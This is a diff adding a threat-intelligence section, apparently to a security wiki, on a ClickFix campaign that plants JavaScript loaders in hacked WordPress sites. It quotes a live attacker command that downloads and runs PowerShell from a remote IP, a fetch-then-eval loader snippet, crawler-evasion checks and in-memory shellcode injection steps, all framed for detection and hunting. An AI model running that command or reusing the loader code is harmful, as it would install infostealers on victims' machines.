@@ -211,6 +211,38 @@ Detection/hunting tips for these variants
 - Network: outbound to CDN worker hosts or blockchain RPC endpoints from script hosts/PowerShell shortly after web browsing.
 - File/registry: temporary `.ps1` creation under `%TEMP%` plus RunMRU entries containing these one-liners; block/alert on signed-script LOLBAS (WScript/cscript/mshta) executing with external URLs or obfuscated alias strings.
 
+### Rapid7 2026 WordPress ClickFix chain: stealth JS loaders + fileless PowerShell
+
+Compromised WordPress sites were observed delivering ClickFix by **injecting stealth JavaScript loaders** into HTML or serving them from `admin-ajax.php`. Key traits you can hunt for in web content and browser traces:
+
+- **Admin/user evasion gates** in the loader: abort if WordPress auth cookies are present (`wordpress_logged_in_`, `wp-settings-`, `wp-saving-`, `wp-postpass_`), if `iframeShown=true` exists, if the **User-Agent** matches crawlers/tools (`bot|crawl|slurp|spider|curl|wget|python|phantomjs|semrush|ahrefs`), or if **referrer/current URL** includes `/wp-admin`, `/wp-json`, `robots.txt`, `sitemap.xml`, or static file extensions.
+- **Endpoint rotation**: Base64 list of remote endpoints → `atob()` → synchronous `XMLHttpRequest.open("GET", url, false)`; first `200` response is injected into `<head>`.
+- **admin-ajax loader**: `fetch('/wp-admin/admin-ajax.php?action=ajjs_run').then(r => r.text()).then(js => eval(js))`.
+- **Injector behavior**: creates an overlay iframe (fake CAPTCHA) and appends `?ref=<compromised-hostname>`; uses `localStorage` (e.g., `iframeShown`) to limit displays.
+
+Obfuscation/anti-analysis seen in the injected JS:
+- **String-array rotation + decoder function** with an initialization loop that shuffles encrypted strings.
+- **Anti-prettify trap**: a `function.toString()` regex check expects **minified formatting**; if prettified, it enters an infinite loop to hang analysis.
+- **Bypass**: set the decoder’s “check passed” flag immediately after definition, e.g.:
+  ```javascript
+  _0x288c.KLCBjr = true
+  ```
+- **DevTools traps** and `console.*` no-ops to reduce interactive analysis.
+- Automated deobfuscation (e.g., **obf-io**) can accelerate the first pass; Rapid7 also published **deobfuscated injector/payload snippets** to match core behavior.
+
+ClickFix execution chain observed on endpoints:
+
+```powershell
+powershell -c iex(irm 91.92.240[.]219 -UseBasicParsing)
+```
+
+- The fetched PowerShell stage **downloads raw shellcode** and executes it fully in-memory: `VirtualAlloc` with `PAGE_EXECUTE_READWRITE (0x40)`, `Marshal.Copy`, then `CreateThread` + `WaitForSingleObject`.
+- **DoubleDonut pattern**: Donut shellcode #1 loads a small downloader, attempts to enable `SeDebugPrivilege`, fetches Donut shellcode #2, then **injects into native-arch `svchost.exe`** to run the final infostealer. Donut payloads can be extracted offline with **donut-decryptor**.
+
+Hunting/pivoting tips for compromised sites:
+- Historical-response hunting via **urlscan.io** to recover injected scripts after cleanup.
+- Pivot on **`?ref=`** query parameters to enumerate **compromised referrer** sites pointing to the same ClickFix infrastructure.
+
 ## Mitigations
 
 1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
@@ -234,5 +266,12 @@ Detection/hunting tips for these variants
 - [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
 - [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 - [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
+- [Rapid7 Labs – When Trusted Websites Turn Malicious: WordPress Compromises Advance Global Stealer Operation](https://www.rapid7.com/blog/post/tr-malicious-websites-wordpress-compromise-advances-global-stealer-operation/)
+- [Rapid7 Labs – ClickFix DoubleDonut deobfuscated injector](https://github.com/rapid7/Rapid7-Labs/blob/main/Misc/ClickFix_DoubleDonut_Deobfuscated_Injector.js.txt)
+- [Rapid7 Labs – ClickFix DoubleDonut deobfuscated payload](https://github.com/rapid7/Rapid7-Labs/blob/main/Misc/ClickFix_DoubleDonut_Deobfuscated_Payload.js.txt)
+- [Donut loader](https://github.com/TheWover/donut)
+- [donut-decryptor](https://github.com/volexity/donut-decryptor)
+- [obf-io deobfuscator](https://obf-io.deobfuscate.io/)
+- [urlscan.io](https://urlscan.io/)
 
 {{#include ../../banners/hacktricks-training.md}}
